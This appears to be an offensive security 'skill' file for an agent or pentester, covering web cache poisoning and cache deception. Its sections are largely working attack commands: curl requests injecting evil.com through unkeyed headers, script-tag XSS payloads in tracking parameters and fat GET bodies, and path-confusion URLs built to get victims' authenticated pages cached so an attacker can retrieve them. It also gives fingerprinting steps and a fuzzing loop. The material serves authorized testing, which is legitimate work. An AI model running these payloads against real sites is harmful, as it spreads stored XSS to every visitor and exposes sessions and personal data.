---
name: cache_poisoning
description: Web cache poisoning and cache deception — manipulate cached responses for stored XSS at CDN scale, or trick caches into storing authenticated data
---

# Web Cache Poisoning & Deception

Cache poisoning and cache deception are distinct but related attacks against web caching infrastructure. **Poisoning** injects malicious content into cached responses served to all users. **Deception** tricks the cache into storing authenticated/personalized responses that attackers can then retrieve. Both exploit the gap between what the cache considers "the same request" (the cache key) and what the origin considers relevant (the full request).

## Attack Surface

**Cache Poisoning (attacker controls response content)**
- Unkeyed headers that influence origin response but are not part of the cache key
- Unkeyed query parameters on cacheable endpoints
- Fat GET requests (GET with body) where the body influences the response
- HTTP method override headers on cached endpoints

**Cache Deception (attacker tricks cache into storing victim's response)**
- Path confusion: appending static file extensions to dynamic endpoints
- Parser discrepancies between CDN and origin (semicolons, dots, null bytes, newlines)
- Directory traversal in cache key construction
- Delimiter confusion between CDN routing and origin framework

**CDN/Cache Layers**
- Cloudflare, Akamai, Fastly, AWS CloudFront, Google Cloud CDN
- Varnish, Nginx proxy_cache, Squid, Apache Traffic Server
- Application-level caches (Redis-backed page caching, framework cache middleware)

## CDN Fingerprinting

Identify the caching layer before testing — behavior varies significantly:

```bash
# Check response headers for CDN indicators
curl -sI https://target.com | grep -iE 'cf-cache-status|x-cache|x-served-by|x-amz-cf|age|via|x-varnish|x-fastly'

# Cloudflare: cf-cache-status, cf-ray
# Akamai: x-cache, x-akamai-transformed, x-true-cache-key
# Fastly: x-served-by, x-cache, x-cache-hits, fastly-restarts
# CloudFront: x-amz-cf-pop, x-amz-cf-id, x-cache
# Varnish: x-varnish, via: 1.1 varnish
```

**Cache key discovery:**
```bash
# Akamai: pragma header reveals cache key
curl -sI -H 'Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key' https://target.com

# Fastly: X-Cache-Debug
curl -sI -H 'Fastly-Debug: 1' https://target.com
```

## Cache Poisoning Techniques

### Unkeyed Header Injection

Headers not included in the cache key but reflected in the response:

**X-Forwarded-Host:**
```bash
# Test if X-Forwarded-Host is reflected in the response
curl -s -H 'X-Forwarded-Host: evil.com' https://target.com | grep evil.com

# If reflected in script/link tags → stored XSS via cache
# <script src="https://evil.com/static/main.js"></script>
```

**X-Forwarded-Scheme / X-Forwarded-Proto:**
```bash
# Force HTTP redirect that gets cached
curl -sI -H 'X-Forwarded-Scheme: http' https://target.com
# Response: 301 Location: http://target.com/ (downgrade cached for all users)
```

**X-Original-URL / X-Rewrite-URL:**
```bash
# Override the parsed URL (common in IIS/Nginx)
curl -s -H 'X-Original-URL: /admin' https://target.com/static/cacheable.js
```

**X-HTTP-Method-Override:**
```bash
# Change the effective method for the origin while cache sees GET
curl -s -H 'X-HTTP-Method-Override: POST' 'https://target.com/api/action'
```

### Unkeyed Query Parameters

Some CDNs exclude certain query parameters from the cache key:

```bash
# Common excluded parameters (UTM, tracking)
curl -s 'https://target.com/page?utm_content=<script>alert(1)</script>'
curl -s 'https://target.com/page?fbclid=<script>alert(1)</script>'
curl -s 'https://target.com/page?_=<script>alert(1)</script>'

# If the parameter is reflected in the response but excluded from cache key,
# subsequent requests to /page (without the parameter) get the poisoned response
```

### Fat GET Poisoning

Some origins process GET request bodies, but caches ignore them:
```bash
# Cache keys on URL only; origin reads the body
curl -s -X GET -d '{"search":"<script>alert(1)</script>"}' \
  -H 'Content-Type: application/json' \
  'https://target.com/api/search'
```

### Parameter Cloaking

Exploit parser differences in query string handling:
```bash
# Ruby on Rails parses ; as parameter separator; CDN does not
curl -s 'https://target.com/page?innocent=1;evil=<script>alert(1)</script>'
# CDN cache key: /page?innocent=1;evil=... (one parameter)
# Origin sees: innocent=1, evil=<script>... (two parameters)
```

## Cache Deception Techniques

### Path Confusion (Static Extension Tricks)

Trick the CDN into caching a dynamic, authenticated response by appending a static file extension:

**Direct extension append:**
```bash
# Victim visits (attacker sends crafted link):
https://target.com/account/settings/anything.css
# CDN sees .css extension → cacheable
# Origin ignores /anything.css → serves /account/settings with auth data
# Attacker fetches same URL → gets victim's cached account page
```

### Parser Discrepancy Exploits (PortSwigger "Gotta Cache 'em All", 2025)

**Spring Framework semicolons:**
```bash
# Spring treats ; as path parameter delimiter and strips everything after
https://target.com/account;x.css
# CDN: caches because path ends in .css
# Spring: serves /account (ignores ;x.css)
```

**Rails dot notation:**
```bash
# Rails treats .css as format parameter
https://target.com/account.css
# CDN: caches (static extension)
# Rails: serves /account with format=css (often still returns HTML)
```

**Nginx encoded newline:**
```bash
# Encoded newline truncates path in some Nginx configs
https://target.com/account%0A.css
# CDN: caches (.css extension)
# Nginx: truncates at newline, serves /account
```

**OpenLiteSpeed null byte:**
```bash
# Null byte truncates path
https://target.com/account%00.css
# CDN: caches (.css extension)
# OpenLiteSpeed: truncates at null byte, serves /account
```

**Path parameter injection:**
```bash
# Encoded question mark
https://target.com/account%3F.css
# CDN: /account%3F.css (cached as static)
# Origin: /account?.css (query string starts at ?)
```

### Directory Delimiter Confusion

```bash
# Test different path delimiters
https://target.com/account/..%2Fstatic/cached.css
https://target.com/static/..%2Faccount
https://target.com/account%23.css
https://target.com/account%3B.css
```

## Tools

**Param Miner (Burp BApp)**
```
Right-click request > Extensions > Param Miner > Guess headers / params
```
Discovers unkeyed headers and parameters by fuzzing and observing response differences.

**toxicache**
```bash
# Automated cache poisoning scanner
python3 toxicache.py -u https://target.com/ --headers
python3 toxicache.py -u https://target.com/ --params
```

**Web Cache Vulnerability Scanner (Hackmanit)**
```bash
java -jar wcvs.jar -u https://target.com -p payloads.txt
```

**Manual Header Fuzzing**
```bash
# Test common unkeyed headers
for header in X-Forwarded-Host X-Forwarded-Scheme X-Forwarded-Proto X-Original-URL X-Rewrite-URL X-HTTP-Method-Override X-Forwarded-Port X-Forwarded-Prefix; do
  echo "Testing: $header"
  curl -sI -H "$header: evil.com" 'https://target.com/' | grep -iE 'evil|cache-status|x-cache'
done
```

**Cache Buster Technique**
```bash
# Always use a cache buster when testing to avoid poisoning real cache entries
curl -s -H 'X-Forwarded-Host: evil.com' 'https://target.com/?cachebuster=abc123'
# Only remove the cache buster for the final PoC confirmation
```

## Testing Methodology

1. **Fingerprint cache layer** — Identify CDN/cache via response headers, determine cache key composition
2. **Map cacheable endpoints** — Find URLs that return cache HIT (send same request twice, check Age/X-Cache)
3. **Discover unkeyed inputs** — Use Param Miner to find headers and parameters excluded from the cache key
4. **Test reflection** — Confirm unkeyed inputs are reflected in the response body or headers
5. **Poison with cache buster** — Add a unique query parameter to avoid affecting production cache
6. **Verify persistence** — Fetch the poisoned URL without the malicious header to confirm the cache serves the poisoned response
7. **For cache deception** — Test path confusion techniques (extension append, parser discrepancy payloads) against authenticated endpoints
8. **Measure TTL** — Determine how long the poisoned entry persists (check Age, Cache-Control, Expires)

## Validation Requirements

1. **Cache poisoning**: Show that a request without the malicious input receives the poisoned response from cache (prove the cache stored and serves the poisoned content)
2. **Cache deception**: Show that an authenticated endpoint's response is cached and retrievable by an unauthenticated user via a crafted URL
3. **Document the cache key** — Show exactly which components are keyed and which are not
4. **Demonstrate impact** — XSS execution, credential/token exposure, or sensitive data leakage from the cached response
5. **Note the TTL** — Report how long the poisoned entry persists and the blast radius (all users vs specific path)

## False Positives

- Headers reflected in the response but the response is not cached (cache-control: no-store, private)
- CDN caches the response but includes the tested header in the cache key (no cross-user impact)
- Path confusion URLs return 404 from the origin (the trick does not work against the specific framework)
- Application-level Vary header correctly includes the tested input

## Impact

- **Cache poisoning → stored XSS at CDN scale** — every user visiting the URL gets the XSS payload, no per-user interaction needed
- **Cache poisoning → credential harvesting** — redirect all users to a phishing page via cached redirect
- **Cache deception → account data theft** — steal session tokens, PII, API keys from cached authenticated responses
- **Cache poisoning → denial of service** — cache error pages or redirect loops for critical endpoints
- **Supply chain risk** — poisoned CDN responses for JavaScript libraries affect all downstream sites

## Pro Tips

1. Always use a cache buster (unique query parameter) during testing to avoid poisoning production caches
2. Send the poisoning request multiple times — some CDNs require the cache to be cold (miss) before storing
3. Check the Vary header — it determines which request headers are part of the cache key
4. Test from different IPs/regions — some CDNs have region-specific caches
5. For cache deception, you need a victim to visit the crafted URL while authenticated — this requires a social engineering or link injection vector
6. The "Gotta Cache 'em All" parser discrepancy techniques are extremely effective against modern stacks (Spring + Cloudflare, Rails + Akamai, etc.)
7. Monitor the Age header to understand cache lifecycle and time your poisoning attempts
8. Some CDNs normalize paths before caching — test encoding variations to find normalizations they miss

## Summary

Cache poisoning and deception exploit the gap between what caches key on and what origins process. Unkeyed headers and parser discrepancies between CDN and origin are the two primary attack vectors. Cache poisoning delivers stored XSS at infrastructure scale; cache deception steals authenticated data. Both require careful fingerprinting of the caching layer and disciplined use of cache busters during testing.
